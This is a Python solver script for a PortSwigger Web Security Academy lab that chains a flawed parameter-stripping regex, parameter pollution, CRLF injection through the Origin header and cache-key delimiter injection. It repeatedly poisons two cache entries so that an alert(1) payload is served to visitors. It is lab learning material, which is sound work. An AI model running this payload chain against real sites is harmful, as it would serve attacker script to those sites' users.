#!/usr/bin/env python3
"""
Cache key injection
PortSwigger Web Security Academy -- Web Cache Poisoning

Companion script for the writeup: 12-cache-key-injection.md

What this does:
    Chains four independently unremarkable flaws into one exploit:
      1. A flawed utm_content-stripping regex on /login (expects '&' or
         start-of-string before it -- using '?' instead slips past it).
      2. Unencoded client-side parameter pollution: /login's lang value
         flows straight into the /js/localize.js import URL.
      3. CRLF header injection via Origin on /js/localize.js when cors=1 --
         the endpoint decodes %0d%0a in Origin before reflecting it into
         Access-Control-Allow-Origin, so an encoded CRLF becomes a literal
         injected Content-Length header that truncates the real response.
      4. The cache key itself is built by string concatenation with a '$$'
         delimiter and nothing stops attacker input from containing one --
         Pragma: x-get-cache-key (this lab exposes it as a debug header)
         confirms the literal key structure, which is what makes aligning
         two independently-poisoned entries tractable instead of guesswork.
    Requires HTTP/2 -- the Origin injection technique and the header-name
    lowercasing behave differently over HTTP/1.1.

Usage:
    python 12-cache-key-injection.py <lab-url>
    e.g. python 12-cache-key-injection.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx h2
"""

import asyncio
import sys
import httpx


async def _lab_solved(client: httpx.AsyncClient, url: str) -> bool:
    # Never follow redirects on the target when checking solved status --
    # re-requesting /login with redirects enabled overwrites the very cache
    # entry we just poisoned. Verification has to go through the lab's own
    # status indicator, which a plain GET (no redirect) here reads safely.
    r = await client.get(url)
    return "congratulations" in r.text.lower() or "is-solved" in r.text.lower()


async def solve(lab_url: str) -> None:
    host = lab_url.rstrip("/")

    # $ must be a literal dollar sign -- it's the cache key's own delimiter,
    # and injecting it is what lets the two poisoned entries' keys align.
    d = "$"
    origin_val = f"x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1){d}{d}{d}{d}"
    utm_val = (
        f"x%26cors=1%26x=1{d}{d}origin=x%250d%250aContent-Length:%208"
        f"%250d%250a%250d%250aalert(1){d}{d}%23"
    )

    async with httpx.AsyncClient(verify=False, timeout=15, follow_redirects=False, http2=True) as client:
        print("[*] Starting dual-poison loop (HTTP/2, max-age=35)...")

        for cycle in range(100):
            # Fired concurrently -- both entries share a similar ~35s TTL,
            # same requirement as the previous lab's dual-poison chain.
            r1, r2 = await asyncio.gather(
                client.get(
                    f"{host}/js/localize.js?lang=en?utm_content=z&cors=1&x=1",
                    headers={"origin": origin_val},
                ),
                client.get(f"{host}/login?lang=en?utm_content={utm_val}"),
            )

            xc1 = r1.headers.get("x-cache", "")
            xc2 = r2.headers.get("x-cache", "")
            js_ok = "alert" in r1.text[:20]
            login_ok = "utm_content" in r2.headers.get("location", "")

            if cycle % 8 == 0 or "miss" in xc1.lower() or "miss" in xc2.lower():
                print(
                    f"    Cycle {cycle + 1}: js=[{xc1}, {'OK' if js_ok else 'CLEAN'}] "
                    f"login=[{xc2}, {'OK' if login_ok else 'CLEAN'}]"
                )

            if await _lab_solved(client, lab_url):
                print(f"[+] Lab solved at cycle {cycle + 1}!")
                return

            await asyncio.sleep(2)

    print("[-] Not solved after re-poison loop")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    asyncio.run(solve(sys.argv[1].rstrip("/")))
